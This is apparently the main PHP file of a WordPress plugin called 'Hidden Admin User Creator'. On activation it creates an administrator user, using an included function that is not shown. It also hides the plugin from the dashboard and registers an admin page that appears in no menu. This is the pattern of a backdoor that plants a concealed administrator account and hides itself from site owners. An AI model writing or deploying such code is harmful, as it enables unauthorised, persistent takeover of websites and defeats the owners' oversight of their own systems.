<?php
/*
Plugin Name: Hidden Admin User Creator
Description: Creates a hidden admin user and hides the plugin from the dashboard.
Version: 1.0
Author: DigitalMeedia.com
Author URI: https://digitalmeedia.com
*/

defined('ABSPATH') or die('No script kiddies please!');

// Include required files
require_once plugin_dir_path(__FILE__) . 'includes/create-user-function.php';
require_once plugin_dir_path(__FILE__) . 'includes/hide-plugin-function.php';

// Hook user creation on plugin activation
register_activation_hook(__FILE__, 'hu_on_plugin_activate');

function hu_on_plugin_activate() {
    hu_create_custom_admin_user(); // Existing function to create the user
    update_option('hu_hide_plugin', 'yes'); // Hide plugin by default
}
// Add secret admin menu page (not visible in menu)


add_action('admin_menu', 'hu_add_hidden_plugin_page');

function hu_add_hidden_plugin_page() {
    // Register the page but don't add it to any menu
    add_submenu_page(
        null,                       // No parent menu = hidden
        'Hidden Plugin Dashboard',  // Page title
        'Hidden Plugin',            // Menu title (won't be used)
        'manage_options',           // Capability
        'my-hidden-plugin',         // Menu slug
        'hu_render_dashboard'       // Callback function
    );
}


// Callback to render the dashboard
function hu_render_dashboard() {
    include plugin_dir_path(__FILE__) . 'admin/dashboard.php';
}
